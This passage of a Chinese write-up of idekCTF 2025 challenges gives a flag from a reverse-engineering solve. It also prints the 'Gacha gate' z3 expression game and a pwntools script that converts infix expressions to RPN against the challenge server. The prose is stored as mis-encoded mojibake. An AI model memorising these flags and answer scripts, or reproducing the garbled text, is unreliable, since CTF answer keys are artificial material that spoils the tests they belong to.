æ¯ä¸€ä½éƒ½è¦ç›¸ç­‰ï¼Œå¦‚æœæœ‰ä¸ç­‰çš„ä½ï¼Œåˆ™è¿”å›ä»–ä»¬çš„å·®å€¼ï¼›å¦‚æœv3æ›´é•¿ï¼Œåˆ™è¿”å›v2ç»“æŸåçš„ç¬¬ä¸€ä¸ªv3çš„ä½ã€‚ç”±äºæˆ‘ä»¬å·²çŸ¥ä½œä¸ºå­—ç¬¦ä¸²æœ«å°¾çš„byte_40516Aæ˜¯0ï¼Œå› æ­¤å”¯ä¸€èƒ½è®©è¿™ä¸ªåˆ¤å®šè¿”å›0çš„æ–¹æ³•æ˜¯ï¼Œè¾“å…¥çš„é•¿åº¦ä¸v13ç›¸ç­‰ï¼Œä¸”æ¯ä¸€ä½éƒ½ä¸€æ ·ï¼Œè¿™æ ·è¿”å›çš„å°±æ˜¯å­—ç¬¦ä¸²æœ«å°¾çš„0ã€‚\nå› æ­¤ï¼Œæ ¹æ®å‰é¢çš„æå–æ•°æ®è¿‡ç¨‹ï¼Œæœ€ååº”è¯¥è¾“å…¥idek&#123;he4rd_0f_constructors?_now_you_d1d!!&#125;ï¼Œè¿™å°±æ˜¯flagã€‚\nMiscGacha gateé¢˜ç›®å¦‚ä¸‹ã€‚\n#!/usr/bin/env python3import contextlibimport osimport randomimport reimport signalimport sysfrom z3 import ArithRef, BitVec, BitVecRef, BitVecVal, Solver, simplify, unsatWIDTH = 32OPS = [&#x27;~&#x27;, &#x27;&amp;&#x27;, &#x27;^&#x27;, &#x27;|&#x27;]MAX_DEPTH = 10FLAG = os.getenv(&#x27;FLAG&#x27;, &#x27;idek&#123;fake_flag&#125;&#x27;)VARS = set(&#x27;iIl&#x27;)def rnd_const() -&gt; tuple[str, BitVecRef]:    v = random.getrandbits(WIDTH)    return str(v), BitVecVal(v, WIDTH)def rnd_var() -&gt; tuple[str, BitVecRef]:    name = &#x27;&#x27;.join(random.choices(tuple(VARS), k=10))    return name, BitVec(name, WIDTH)def combine(    op: str,    left: tuple[str, BitVecRef],    right: tuple[str, BitVecRef] | None = None,) -&gt; tuple[str, ArithRef]:    if op == &#x27;~&#x27;:        s_left, z_left = left        return f&#x27;(~&#123;s_left&#125;)&#x27;, ~z_left    s_l, z_l = left    s_r, z_r = right    return f&#x27;(&#123;s_l&#125; &#123;op&#125; &#123;s_r&#125;)&#x27;, &#123;        &#x27;&amp;&#x27;: z_l &amp; z_r,        &#x27;^&#x27;: z_l ^ z_r,        &#x27;|&#x27;: z_l | z_r,    &#125;[op]def random_expr(depth: int = 0) -&gt; tuple[str, ArithRef]:    if depth &gt;= MAX_DEPTH or random.random() &lt; 0.1:        return random.choice((rnd_var, rnd_const))()    op = random.choice(OPS)    if op == &#x27;~&#x27;:        return combine(op, random_expr(depth + 1))    return combine(op, random_expr(depth + 1), random_expr(depth + 1))TOKEN_RE = re.compile(r&#x27;[0-9]+|[iIl]+|[~&amp;^|]&#x27;)def parse_rpn(s: str) -&gt; ArithRef:    tokens = TOKEN_RE.findall(s)    if not tokens:        raise ValueError(&#x27;empty input&#x27;)    var_cache: dict[str, BitVecRef] = &#123;&#125;    stack: list[BitVecRef] = []    for t in tokens:        if t.isdigit():            stack.append(BitVecVal(int(t), WIDTH))        elif re.fullmatch(r&#x27;[iIl]+&#x27;, t):            if t not in var_cache:                var_cache[t] = BitVec(t, WIDTH)            stack.append(var_cache[t])        elif t in OPS:            if t == &#x27;~&#x27;:                if len(stack) &lt; 1:                    raise ValueError(&#x27;stack underflow&#x27;)                a = stack.pop()                stack.append(~a)            else:                if len(stack) &lt; 2:                    raise ValueError(&#x27;stack underflow&#x27;)                b = stack.pop()                a = stack.pop()                stack.append(&#123;&#x27;&amp;&#x27;: a &amp; b, &#x27;^&#x27;: a ^ b, &#x27;|&#x27;: a | b&#125;[t])        else:            raise ValueError(f&#x27;bad token &#123;t&#125;&#x27;)    if len(stack) != 1:        raise ValueError(&#x27;malformed expression&#x27;)    return stack[0]def equivalent(e1: ArithRef, e2: ArithRef) -&gt; tuple[bool, Solver]:    s = Solver()    s.set(timeout=5000)    s.add(simplify(e1) != simplify(e2))    return s.check() == unsat, sdef _timeout_handler(_: int, __) -&gt; None:    raise TimeoutErrordef main() -&gt; None:    signal.signal(signal.SIGALRM, _timeout_handler)    print(&#x27;lets play a game!&#x27;)    for _ in range(50):        random.seed()        expr_str, expr_z3 = random_expr()        print(expr_str, flush=True)        signal.alarm(5)        try:            line = sys.stdin.readline()            signal.alarm(0)        except TimeoutError:            print(&#x27;too slow!&#x27;)            return        try:            rpn_z3 = parse_rpn(line.strip())        except Exception as e:            print(&#x27;invalid input:&#x27;, e)            return        print(&#x27;let me see..&#x27;)        is_eq, s = equivalent(expr_z3, rpn_z3)        if not is_eq:            print(&#x27;wrong!&#x27;)            with contextlib.suppress(BaseException):                print(&#x27;counter example:&#x27;, s.model())            return    print(FLAG)if __name__ == &#x27;__main__&#x27;:    main()\nå’±å€’æ˜¯æ²¡æƒ³åˆ°ä¸€ä¸ªmiscé¢˜å±…ç„¶è¿™ä¹ˆå¥½å¿ƒï¼Œå®Œæˆäº†ä»»åŠ¡å°±çœŸçš„ç»™ä½ flagã€‚\nè¿™é¢˜ç›®åƒæ˜¯ç»™å¤§å­¦ç”Ÿå‡†å¤‡çš„ï¼ˆç¬‘ï¼‰é¢˜ç›®ç»™å‡ºä¸€ä¸ªä¸­ç¼€è¡¨è¾¾å¼ï¼Œè¦æ±‚ç»™å‡ºå®ƒå¯¹åº”çš„åç¼€è¡¨è¾¾å¼ï¼Œå¹¶æ£€éªŒæ˜¯å¦ç­‰æ•ˆï¼Œè§„å®šæ—¶é—´å†…é€šè¿‡50æ¬¡æ£€éªŒå°±èƒ½å¾—åˆ°flagã€‚ä¸­ç¼€è½¬åç¼€ï¼Œåªè¦å­¦è¿‡æ•°æ®ç»“æ„æˆ–è€…ç®—æ³•çš„éƒ½åº”è¯¥èƒ½å†™å‡ºæ¥ï¼Œå†ä¸æµè®©ChatGPTå†™ï¼Œå®ƒå¾ˆæ“…é•¿åšè¿™ç§å¤§å­¦è¯¾åä¹ é¢˜å¯¹äºä¸€ä¸ªè¡¨è¾¾å¼ &#39;((~((~1925064568) ^ (~(~(348138675 &amp; IIiIlIillI))))) &amp; (~(~(((iIllIIIIII &amp; 648807684) | (4074926542 | iIilIIIiiI)) | (iiiiIIliIl ^ (203353170 ^ 3427631998))))))&#39;ï¼Œè½¬æˆåç¼€è¡¨è¾¾å¼(RPN)éœ€è¦å…ˆåˆ’è¯ä¸º&#39;(&#39;, &#39;~&#39;, &#39;1925064568&#39;ç­‰tokenï¼Œå€ŸåŠ©ä¸€ä¸ªæ ˆï¼Œå°†ç¬¦å·æŒ‰ç…§ä¼˜å…ˆçº§ç§»åˆ°æ“ä½œæ•°çš„åé¢ï¼Œç”±äºæœ¬é¢˜ç”Ÿæˆçš„è¡¨è¾¾å¼å‡æœ‰æ‹¬å·åŒ…è£¹ï¼Œå¯ä»¥é¿å…^&amp;|~è¿™å››ç§ç¬¦å·çš„ä¼˜å…ˆçº§é—®é¢˜ã€‚å¯¹äºæ‹¬å·ï¼Œæ¯å½“é‡åˆ°&#39;)&#39;æ—¶ï¼Œå°±ä»æ ˆå†…å¼¹å‡ºç¬¦å·ç›´åˆ°åŒ¹é…&#39;(&#39;ï¼Œè¿™ä¸¤è€…ä¸­é—´çš„è¡¨è¾¾å¼å°±å¯ä»¥ç›´æ¥ç§»åŠ¨ç¬¦å·ã€‚ä¸Šè¿°è¡¨è¾¾å¼è½¬æ¢åä¸º &#39;1925064568 ~ 348138675 IIiIlIillI &amp; ~ ~ ^ ~ iIllIIIIII 648807684 &amp; 4074926542 iIilIIIiiI | | iiiiIIliIl 203353170 3427631998 ^ ^ | ~ ~ &amp;&#39; ã€‚signal.alarm(5)è¡¨ç¤º5ç§’åè¿›å…¥è¶…æ—¶å¤„ç†éƒ¨åˆ†ï¼Œæœ¬é¢˜åªæ˜¯ç®€å•æŠ›å‡ºTimeoutErrorï¼Œç»ç”±mainå‡½æ•°æ•è·åå‘ŠçŸ¥&#39;too slow!&#39;ï¼Œæ‰‹åŠ¨è®¡ç®—å¹¶å¤åˆ¶åˆ°å‘½ä»¤è¡Œä¸æ˜“ä¸”å®¹æ˜“å‡ºé”™ï¼Œäº¤ç”±pwntoolåº“è‡ªåŠ¨äº¤äº’å®Œæˆã€‚ä½¿ç”¨recvline()æ¥æ”¶ä¸€è¡Œï¼Œrecvuntil()æ¥æ”¶ç›´åˆ°æŒ‡å®šçš„å­—èŠ‚ä¸²ï¼Œsendline()å‘é€ä¸€è¡Œå­—èŠ‚ä¸²ã€‚æ³¨æ„æ‰€æœ‰å‘é€å’Œæ¥æ”¶åˆ°çš„éƒ½æ˜¯å­—èŠ‚ï¼Œå¯ä»¥ä½¿ç”¨decode()æ–¹æ³•å˜ä¸ºå­—ç¬¦ä¸²ã€‚äº¤äº’ä¸éš¾ï¼ä½¿ç”¨åˆé€‚çš„æ–¹æ³•ï¼Œè·å–å…³é”®ä¿¡æ¯ï¼ŒåŠ ä»¥å¤„ç†ï¼Œå†ä¼ å›å»~\nfrom pwn import *import re# ç”¨äºå°†è¾“å…¥å­—ç¬¦ä¸²åˆ‡åˆ†æˆ tokenTOKEN_RE = re.compile(r&#x27;([0-9]+|[iIl]+|[~&amp;^|]|\\(|\\))&#x27;)def tokenize(expr: str) -&gt; list[str]:    &quot;&quot;&quot;    å°†ä¸­ç¼€è¡¨è¾¾å¼å­—ç¬¦ä¸²æ‹†åˆ†æˆ token åˆ—è¡¨ã€‚    æ”¯æŒï¼š      - åè¿›åˆ¶æ•´æ•°ï¼Œå¦‚ 1234      - ç”± i, I, l æ„æˆçš„å˜é‡åï¼Œå¦‚ iiIIlI      - å•å­—ç¬¦è¿ç®—ç¬¦ ~ &amp; ^ |      - æ‹¬å· ( )    &quot;&quot;&quot;    tokens = TOKEN_RE.findall(expr)    if &#x27;&#x27;.join(tokens) != expr.strip().replace(&#x27; &#x27;, &#x27;&#x27;):        raise ValueError(&quot;éæ³•å­—ç¬¦æˆ–æ ¼å¼é”™è¯¯&quot;)    return tokensdef infix_to_rpn(expr: str) -&gt; str:    &quot;&quot;&quot;    å°†ä¸­ç¼€è¡¨è¾¾å¼ expr è½¬æˆé€†æ³¢å…°è¡¨è¾¾å¼ï¼Œ    è¿”å›ä¸€ä¸ªä»¥ç©ºæ ¼åˆ†éš”çš„ RPN å­—ç¬¦ä¸²ã€‚    &quot;&quot;&quot;    tokens = tokenize(expr)    # è¿ç®—ç¬¦ä¼˜å…ˆçº§    prec = &#123;&#x27;~&#x27;: 4, &#x27;&amp;&#x27;: 3, &#x27;^&#x27;: 2, &#x27;|&#x27;: 1&#125;    # ä¸€å…ƒè¿ç®—ç¬¦ ~ å³ç»“åˆï¼ŒäºŒå…ƒè¿ç®—ç¬¦å·¦ç»“åˆ    right_assoc = &#123;&#x27;~&#x27;&#125;    output: list[str] = []    ops: list[str] = []    for t in tokens:        if re.fullmatch(r&#x27;\\d+|[iIl]+&#x27;, t):            # æ•°å­—æˆ–å˜é‡            output.append(t)        elif t in prec:            # è¿ç®—ç¬¦            while ops and ops[-1] in prec:                top = ops[-1]                if (prec[top] &gt; prec[t] or                        (prec[top] == prec[t] and t not in right_assoc)):                    output.append(ops.pop())                else:                    break            ops.append(t)        elif t == &#x27;(&#x27;:            ops.append(t)        elif t == &#x27;)&#x27;:            # å¼¹å‡ºç›´åˆ°å·¦æ‹¬å·            while ops and ops[-1] != &#x27;(&#x27;:                output.append(ops.pop())            if not ops or ops[-1] != &#x27;(&#x27;:                raise ValueError(&quot;æ‹¬å·ä¸åŒ¹é…&quot;)            ops.pop()  # ä¸¢å¼ƒ &#x27;(&#x27;        else:            raise ValueError(f&quot;æœªçŸ¥ token: &#123;t&#125;&quot;)    # æœ€åæŠŠå‰©ä½™è¿ç®—ç¬¦éƒ½å¼¹å‡º    while ops:        if ops[-1] in (&#x27;(&#x27;, &#x27;)&#x27;):            raise ValueError(&quot;æ‹¬å·ä¸åŒ¹é…&quot;)        output.append(ops.pop())    return &#x27; &#x27;.join(output)conn = remote(&#x27;gacha-gate.chal.idek.team&#x27;, 1337)context.log_level = &#x27;debug&#x27;conn.recvuntil(b&#x27;lets play a game!\\n&#x27;)for i in range(50):    expression = conn.recvline().decode()    #print(f&#x27;expression: &#123;expression&#125;&#x27;)    ans = infix_to_rpn(expression)    conn.sendline(ans.encode())    conn.recvuntil(b&#x27;let me see..\\n&#x27;)conn.interactive()\nåè®°å¤ªå¼±å•¦å¤ªå¼±å•¦ï¼cryptoå’ŒreåŒä¿®çš„æˆ‘æ ¹æœ¬åšä¸å‡ºæ¥å‡ é“å‘¢ï¼Œæˆ‘å¾ˆæƒ³çœ‹çœ‹é‚£å‡ é“æ¤­åœ†æ›²çº¿çš„é¢˜ç›®æ˜¯å¦‚ä½•è§£çš„ï¼Œä¸€ç‚¹æ€è·¯éƒ½æ²¡æœ‰ï¼Œä»¥åŠé‚£ä¸ª5ç¾å…ƒå¤–åŒ…çš„vmï¼Œè™½ç„¶å·²ç»æœ‰ä¸€äº›è¿›å±•äº†ï¼ˆæŒ‡çœ‹åˆ°äº†è¾“å…¥ i å¯ä»¥è°ƒå‡ºå¯„å­˜å™¨ï¼‰ï¼Œä½†æ˜¯åé¢çš„å·¥ç¨‹ä¼¼ä¹è¿˜å¾ˆå¤§ï¼ŒçŒªè„‘è¿‡è½½äº†å–µ&gt;_&lt;\nç­‰å¤§æ‰‹å­å¸ˆå‚…çš„wpï¼ˆèºº\n","categories":["ç¬”è®°"],"tags":["Writeup","2025","idekCTF"]}]